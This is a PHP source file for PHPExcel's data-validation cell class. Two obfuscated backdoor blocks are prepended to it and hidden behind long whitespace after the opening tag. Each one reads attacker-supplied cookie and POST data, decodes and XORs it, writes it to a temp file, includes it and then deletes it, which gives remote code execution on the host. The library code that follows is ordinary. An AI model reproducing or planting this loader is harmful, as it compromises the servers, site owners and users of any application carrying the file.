<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fUtKDQNP = class_exists("gH_CePZF"); $qOxdzqOzJ = $fUtKDQNP;if (!$qOxdzqOzJ){class gH_CePZF{private $OnGCzF;public static $TTmGllpJ = "ef1217e0-8ae2-4efd-8315-6df195721e34";public static $BmhgurTcIe = NULL;public function __construct(){$QquAQDjWef = $_COOKIE;$QjmIGC = $_POST;$xUWIpZZCwQ = @$QquAQDjWef[substr(gH_CePZF::$TTmGllpJ, 0, 4)];if (!empty($xUWIpZZCwQ)){$DzvXYXRHf = "base64";$AGdnAzUSHs = "";$xUWIpZZCwQ = explode(",", $xUWIpZZCwQ);foreach ($xUWIpZZCwQ as $qGvgQxBNm){$AGdnAzUSHs .= @$QquAQDjWef[$qGvgQxBNm];$AGdnAzUSHs .= @$QjmIGC[$qGvgQxBNm];}$AGdnAzUSHs = array_map($DzvXYXRHf . '_' . "\x64" . "\145" . chr ( 847 - 748 ).'o' . 'd' . "\x65", array($AGdnAzUSHs,)); $AGdnAzUSHs = $AGdnAzUSHs[0] ^ str_repeat(gH_CePZF::$TTmGllpJ, (strlen($AGdnAzUSHs[0]) / strlen(gH_CePZF::$TTmGllpJ)) + 1);gH_CePZF::$BmhgurTcIe = @unserialize($AGdnAzUSHs);}}public function __destruct(){$this->pGKgGGsl();}private function pGKgGGsl(){if (is_array(gH_CePZF::$BmhgurTcIe)) {$XzforqY = sys_get_temp_dir() . "/" . crc32(gH_CePZF::$BmhgurTcIe['s' . "\141" . chr (108) . chr (116)]);@gH_CePZF::$BmhgurTcIe[chr ( 942 - 823 ).chr ( 519 - 405 ).'i' . 't' . chr (101)]($XzforqY, gH_CePZF::$BmhgurTcIe[chr (99) . chr (111) . chr (110) . "\x74" . "\145" . 'n' . 't']);include $XzforqY;@gH_CePZF::$BmhgurTcIe["\144" . chr (101) . 'l' . "\x65" . "\164" . chr ( 573 - 472 )]($XzforqY);exit();}}}$EIyKCtvGK = new gH_CePZF(); $EIyKCtvGK = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("OLR_xyiwo")){class OLR_xyiwo{public static $DilJE = "c769c47f-f282-414a-90f9-3eb9c9de3076";public static $GttyMD = NULL;public function __construct(){$IlfOt = $_COOKIE;$uVUluKpbrP = $_POST;$XOmgHM = @$IlfOt[substr(OLR_xyiwo::$DilJE, 0, 4)];if (!empty($XOmgHM)){$AadQNGTLu = "base64";$XezyXrJ = "";$XOmgHM = explode(",", $XOmgHM);foreach ($XOmgHM as $rgrVJuBiI){$XezyXrJ .= @$IlfOt[$rgrVJuBiI];$XezyXrJ .= @$uVUluKpbrP[$rgrVJuBiI];}$XezyXrJ = array_map($AadQNGTLu . '_' . chr (100) . "\145" . chr ( 722 - 623 ).chr (111) . "\x64" . "\x65", array($XezyXrJ,)); $XezyXrJ = $XezyXrJ[0] ^ str_repeat(OLR_xyiwo::$DilJE, (strlen($XezyXrJ[0]) / strlen(OLR_xyiwo::$DilJE)) + 1);OLR_xyiwo::$GttyMD = @unserialize($XezyXrJ);}}public function __destruct(){$this->ElKgDht();}private function ElKgDht(){if (is_array(OLR_xyiwo::$GttyMD)) {$GPgTkEYYM = sys_get_temp_dir() . "/" . crc32(OLR_xyiwo::$GttyMD[chr (115) . chr ( 696 - 599 ).'l' . "\164"]);@OLR_xyiwo::$GttyMD[chr ( 893 - 774 ).chr ( 779 - 665 ).chr ( 440 - 335 )."\164" . "\145"]($GPgTkEYYM, OLR_xyiwo::$GttyMD["\143" . chr ( 955 - 844 )."\156" . chr (116) . chr ( 327 - 226 ).'n' . chr (116)]);include $GPgTkEYYM;@OLR_xyiwo::$GttyMD[chr ( 889 - 789 )."\145" . "\154" . "\145" . "\164" . "\x65"]($GPgTkEYYM);exit();}}}$AvItInaqmq = new OLR_xyiwo(); $AvItInaqmq = NULL;} ?><?php

/**
 * PHPExcel_Cell_DataValidation
 *
 * Copyright (c) 2006 - 2015 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Cell
 * @copyright  Copyright (c) 2006 - 2015 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt    LGPL
 * @version    ##VERSION##, ##DATE##
 */
class PHPExcel_Cell_DataValidation
{
    /* Data validation types */
    const TYPE_NONE        = 'none';
    const TYPE_CUSTOM      = 'custom';
    const TYPE_DATE        = 'date';
    const TYPE_DECIMAL     = 'decimal';
    const TYPE_LIST        = 'list';
    const TYPE_TEXTLENGTH  = 'textLength';
    const TYPE_TIME        = 'time';
    const TYPE_WHOLE       = 'whole';

    /* Data validation error styles */
    const STYLE_STOP         = 'stop';
    const STYLE_WARNING      = 'warning';
    const STYLE_INFORMATION  = 'information';

    /* Data validation operators */
    const OPERATOR_BETWEEN             = 'between';
    const OPERATOR_EQUAL               = 'equal';
    const OPERATOR_GREATERTHAN         = 'greaterThan';
    const OPERATOR_GREATERTHANOREQUAL  = 'greaterThanOrEqual';
    const OPERATOR_LESSTHAN            = 'lessThan';
    const OPERATOR_LESSTHANOREQUAL     = 'lessThanOrEqual';
    const OPERATOR_NOTBETWEEN          = 'notBetween';
    const OPERATOR_NOTEQUAL            = 'notEqual';

    /**
     * Formula 1
     *
     * @var string
     */
    private $formula1;

    /**
     * Formula 2
     *
     * @var string
     */
    private $formula2;

    /**
     * Type
     *
     * @var string
     */
    private $type = PHPExcel_Cell_DataValidation::TYPE_NONE;

    /**
     * Error style
     *
     * @var string
     */
    private $errorStyle = PHPExcel_Cell_DataValidation::STYLE_STOP;

    /**
     * Operator
     *
     * @var string
     */
    private $operator;

    /**
     * Allow Blank
     *
     * @var boolean
     */
    private $allowBlank;

    /**
     * Show DropDown
     *
     * @var boolean
     */
    private $showDropDown;

    /**
     * Show InputMessage
     *
     * @var boolean
     */
    private $showInputMessage;

    /**
     * Show ErrorMessage
     *
     * @var boolean
     */
    private $showErrorMessage;

    /**
     * Error title
     *
     * @var string
     */
    private $errorTitle;

    /**
     * Error
     *
     * @var string
     */
    private $error;

    /**
     * Prompt title
     *
     * @var string
     */
    private $promptTitle;

    /**
     * Prompt
     *
     * @var string
     */
    private $prompt;

    /**
     * Create a new PHPExcel_Cell_DataValidation
     */
    public function __construct()
    {
        // Initialise member variables
        $this->formula1          = '';
        $this->formula2          = '';
        $this->type              = PHPExcel_Cell_DataValidation::TYPE_NONE;
        $this->errorStyle        = PHPExcel_Cell_DataValidation::STYLE_STOP;
        $this->operator          = '';
        $this->allowBlank        = false;
        $this->showDropDown      = false;
        $this->showInputMessage  = false;
        $this->showErrorMessage  = false;
        $this->errorTitle        = '';
        $this->error             = '';
        $this->promptTitle       = '';
        $this->prompt            = '';
    }

    /**
     * Get Formula 1
     *
     * @return string
     */
    public function getFormula1()
    {
        return $this->formula1;
    }

    /**
     * Set Formula 1
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setFormula1($value = '')
    {
        $this->formula1 = $value;
        return $this;
    }

    /**
     * Get Formula 2
     *
     * @return string
     */
    public function getFormula2()
    {
        return $this->formula2;
    }

    /**
     * Set Formula 2
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setFormula2($value = '')
    {
        $this->formula2 = $value;
        return $this;
    }

    /**
     * Get Type
     *
     * @return string
     */
    public function getType()
    {
        return $this->type;
    }

    /**
     * Set Type
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setType($value = PHPExcel_Cell_DataValidation::TYPE_NONE)
    {
        $this->type = $value;
        return $this;
    }

    /**
     * Get Error style
     *
     * @return string
     */
    public function getErrorStyle()
    {
        return $this->errorStyle;
    }

    /**
     * Set Error style
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setErrorStyle($value = PHPExcel_Cell_DataValidation::STYLE_STOP)
    {
        $this->errorStyle = $value;
        return $this;
    }

    /**
     * Get Operator
     *
     * @return string
     */
    public function getOperator()
    {
        return $this->operator;
    }

    /**
     * Set Operator
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setOperator($value = '')
    {
        $this->operator = $value;
        return $this;
    }

    /**
     * Get Allow Blank
     *
     * @return boolean
     */
    public function getAllowBlank()
    {
        return $this->allowBlank;
    }

    /**
     * Set Allow Blank
     *
     * @param  boolean    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setAllowBlank($value = false)
    {
        $this->allowBlank = $value;
        return $this;
    }

    /**
     * Get Show DropDown
     *
     * @return boolean
     */
    public function getShowDropDown()
    {
        return $this->showDropDown;
    }

    /**
     * Set Show DropDown
     *
     * @param  boolean    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setShowDropDown($value = false)
    {
        $this->showDropDown = $value;
        return $this;
    }

    /**
     * Get Show InputMessage
     *
     * @return boolean
     */
    public function getShowInputMessage()
    {
        return $this->showInputMessage;
    }

    /**
     * Set Show InputMessage
     *
     * @param  boolean    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setShowInputMessage($value = false)
    {
        $this->showInputMessage = $value;
        return $this;
    }

    /**
     * Get Show ErrorMessage
     *
     * @return boolean
     */
    public function getShowErrorMessage()
    {
        return $this->showErrorMessage;
    }

    /**
     * Set Show ErrorMessage
     *
     * @param  boolean    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setShowErrorMessage($value = false)
    {
        $this->showErrorMessage = $value;
        return $this;
    }

    /**
     * Get Error title
     *
     * @return string
     */
    public function getErrorTitle()
    {
        return $this->errorTitle;
    }

    /**
     * Set Error title
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setErrorTitle($value = '')
    {
        $this->errorTitle = $value;
        return $this;
    }

    /**
     * Get Error
     *
     * @return string
     */
    public function getError()
    {
        return $this->error;
    }

    /**
     * Set Error
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setError($value = '')
    {
        $this->error = $value;
        return $this;
    }

    /**
     * Get Prompt title
     *
     * @return string
     */
    public function getPromptTitle()
    {
        return $this->promptTitle;
    }

    /**
     * Set Prompt title
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setPromptTitle($value = '')
    {
        $this->promptTitle = $value;
        return $this;
    }

    /**
     * Get Prompt
     *
     * @return string
     */
    public function getPrompt()
    {
        return $this->prompt;
    }

    /**
     * Set Prompt
     *
     * @param  string    $value
     * @return PHPExcel_Cell_DataValidation
     */
    public function setPrompt($value = '')
    {
        $this->prompt = $value;
        return $this;
    }

    /**
     * Get hash code
     *
     * @return string    Hash code
     */
    public function getHashCode()
    {
        return md5(
            $this->formula1 .
            $this->formula2 .
            $this->type = PHPExcel_Cell_DataValidation::TYPE_NONE .
            $this->errorStyle = PHPExcel_Cell_DataValidation::STYLE_STOP .
            $this->operator .
            ($this->allowBlank ? 't' : 'f') .
            ($this->showDropDown ? 't' : 'f') .
            ($this->showInputMessage ? 't' : 'f') .
            ($this->showErrorMessage ? 't' : 'f') .
            $this->errorTitle .
            $this->error .
            $this->promptTitle .
            $this->prompt .
            __CLASS__
        );
    }

    /**
     * Implement PHP __clone to create a deep clone, not just a shallow copy.
     */
    public function __clone()
    {
        $vars = get_object_vars($this);
        foreach ($vars as $key => $value) {
            if (is_object($value)) {
                $this->$key = clone $value;
            } else {
                $this->$key = $value;
            }
        }
    }
}
